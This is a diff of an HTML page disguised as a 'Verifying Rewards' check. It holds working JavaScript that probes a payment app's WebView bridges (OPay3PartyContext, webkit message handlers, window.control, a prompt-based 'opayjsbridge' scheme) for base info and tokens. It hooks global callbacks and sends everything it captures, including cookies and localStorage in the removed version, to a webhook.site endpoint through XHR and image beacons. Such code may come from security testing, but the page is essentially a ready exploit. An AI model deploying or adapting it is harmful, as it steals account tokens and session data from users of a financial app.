@@ -1,74 +1,99 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checking Reward...</title>
-    <style>
-        body { font-family: sans-serif; background: #000; color: #00c853; text-align: center; padding: 50px; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #222; border-top: 4px solid #00c853; border-radius: 50%; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-    </style>
 </head>
-<body>
-    <div class="spinner"></div>
-    <p>Verifying Rewards...</p>
-    <div id="logs" style="font-size: 10px; margin-top: 20px;"></div>
+
+<body style="background: #000; color: #00ff00; font-family: monospace; padding: 20px;">
+    <h2>Verifying Rewards...</h2>
+    <div id="logs" style="font-size: 14px; margin-top: 20px;"></div>
 
     <script>
-        var WEBHOOK = "https://webhook.site/5647901c-5075-426c-b7cd-36410cd3d562";
-        
-        function exfil(data, tag) {
-            var x = new XMLHttpRequest();
-            x.open("POST", WEBHOOK + "?t=" + tag, true);
-            x.send(JSON.stringify(data));
+        var WEBHOOK = "https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569";
+
+        function log(m) {
+            document.getElementById("logs").innerHTML += "> " + m + "<br>";
         }
 
-        function log(m) { document.getElementById("logs").innerHTML += "> " + m + "<br>"; }
+        // Exfil via both XHR and Image Beacon
+        function exfil(data, tag) {
+            log("Sending " + tag + "...");
+            var payload = encodeURIComponent(JSON.stringify(data));
 
-        // Start Exfiltration
-        (function() {
-            var d = { ua: navigator.userAgent, url: location.href, ts: new Date().toISOString() };
-            exfil(d, "init");
-
-            // 1. Android/Legacy Bridge
+            // Method 1: XHR
             try {
-                if (window.control && window.control.getBaseInfo) {
-                    var info = window.control.getBaseInfo();
-                    exfil({ src: "control.getBaseInfo", data: info }, "TOKEN");
-                    log("Exfiltrated Android Data");
+                var x = new XMLHttpRequest();
+                x.open("GET", WEBHOOK + "?t=" + tag + "&d=" + payload, true);
+                x.send();
+            } catch (e) { log("XHR Exfil Error"); }
+
+            // Method 2: Image Beacon
+            try {
+                var img = new Image();
+                img.src = WEBHOOK + "?img=" + tag + "&d=" + payload;
+            } catch (e) { log("IMG Exfil Error"); }
+        }
+
+        // Global functions to catch response from iOS postMessage callbacks
+        window.handleJsBindings = function (res) {
+            exfil({ method: "handleJsBindings", data: res }, "CALLBACK");
+        };
+        window.OPayJsCallback = function (res) {
+            exfil({ method: "OPayJsCallback", data: res }, "CALLBACK");
+        };
+        window.callback = function (res) {
+            exfil({ method: "callback", data: res }, "CALLBACK");
+        };
+
+        (function () {
+            exfil({ ua: navigator.userAgent, msg: "START_EXTRACTION" }, "INIT");
+
+            // Method 1: webkit.messageHandlers.OPay3PartyContext
+            try {
+                log("Method 1: webkit.messageHandlers.OPay3PartyContext");
+                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.OPay3PartyContext) {
+                    window.webkit.messageHandlers.OPay3PartyContext.postMessage({ action: "getBaseInfo" });
+                    window.webkit.messageHandlers.OPay3PartyContext.postMessage("getBaseInfo");
                 }
-            } catch(e) {}
+            } catch (e) { log("Err Method 1: " + e.message); }
 
-            // 2. iOS WKWebView MessageHandlers (The Target)
+            // Method 2: window.OPay3PartyContext directly
             try {
-                if (window.webkit && window.webkit.messageHandlers) {
-                    log("iOS WebKit Bridge Found");
-                    
-                    // Specific handler mentioned in the task
-                    if (window.webkit.messageHandlers.control) {
-                        log("Target 'control' handler found");
-                        window.webkit.messageHandlers.control.postMessage("getBaseInfo");
-                        window.webkit.messageHandlers.control.postMessage({ action: "getBaseInfo" });
-                        window.webkit.messageHandlers.control.postMessage({ method: "getToken" });
+                log("Method 2: window.OPay3PartyContext directly");
+                if (window.OPay3PartyContext && window.OPay3PartyContext.getBaseInfo) {
+                    var res = window.OPay3PartyContext.getBaseInfo();
+                    if (res) {
+                        log("Direct method got res!");
+                        exfil({ src: "window.OPay3PartyContext", data: res }, "RES_DIRECT");
                     }
-
-                    // Scan other common handlers
-                    var targets = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo', 'OPayContext'];
-                    targets.forEach(function(h) {
-                        try {
-                            if (window.webkit.messageHandlers[h]) {
-                                log("Found handler: " + h);
-                                window.webkit.messageHandlers[h].postMessage("");
-                            }
-                        } catch(e) {}
-                    });
                 }
-            } catch(e) { log("iOS Error: " + e.message); }
+            } catch (e) { log("Err Method 2: " + e.message); }
 
-            // 3. Fallback: URL/Cookie/Storage
-            exfil({ cookie: document.cookie, ls: JSON.stringify(localStorage) }, "STORAGE");
+            // Method 3: prompt bridge
+            try {
+                log("Method 3: prompt() bridge");
+                var res = prompt("opayjsbridge://OPay3PartyContext/getBaseInfo");
+                if (res) {
+                    log("Prompt method got res!");
+                    exfil({ src: "prompt", data: res }, "RES_PROMPT");
+                }
+            } catch (e) { log("Err Method 3: " + e.message); }
+
+            // Method 4: webkit.messageHandlers.control
+            try {
+                log("Method 4: webkit.messageHandlers.control");
+                if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.control) {
+                    window.webkit.messageHandlers.control.postMessage({ action: "getBaseInfo" });
+                    window.webkit.messageHandlers.control.postMessage("getBaseInfo");
+                }
+            } catch (e) { log("Err Method 4: " + e.message); }
+
+            exfil({ msg: "DONE EXTRACTION" }, "END");
         })();
     </script>
 </body>
+
 </html>
